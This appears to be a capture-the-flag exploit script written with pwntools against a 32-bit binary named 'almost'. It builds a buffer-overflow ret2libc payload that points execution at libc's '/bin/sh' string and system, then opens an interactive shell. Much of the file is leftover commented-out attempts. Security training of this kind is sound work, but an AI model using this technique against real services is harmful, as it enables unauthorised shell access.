
from pwn import *

#io = remote('jh2i.com', 50021)
#io = process('./almost')
io = gdb.debug('./almost', 'c')
binary = ELF('./almost')
context.binary = binary
rop = ROP(binary)
libc = ELF('/lib32/libc.so.6')

print("started proc")
data = io.recv()
print(data)
payload = b"A" * 2048
libc.address = 0xf7cf6000
#payload += p64(0x000000000040098b)
io.sendline("A" * 64)
data = io.recvline()
print(data)
io.sendline("A" * 64)
data = io.recvline()
print(data)

'''
rop.raw("A" * 60)
rop.raw(0x080486f2)
rop.raw(next(libc.search(b'/bin/sh')))
rop.raw(libc.symbols['system'])

print(libc.symbols['system'])
#print(next(libc.search('/bin/sh')))
'''
payload = b"BBBBCCCCDDDDEEEE"
payload += p32(0x080486f2)
payload += p32(next(libc.search(b'/bin/sh')))
payload += b"HHHH"
#payload += p32(next(libc.search(b'/bin/sh')))

#payload += p32(next(libc.search(b'/bin/sh')))
#payload += p32(0x080486f2)
#payload += p32(0x080486f2)

#payload += b"IIII"
io.sendline(payload)

io.interactive()

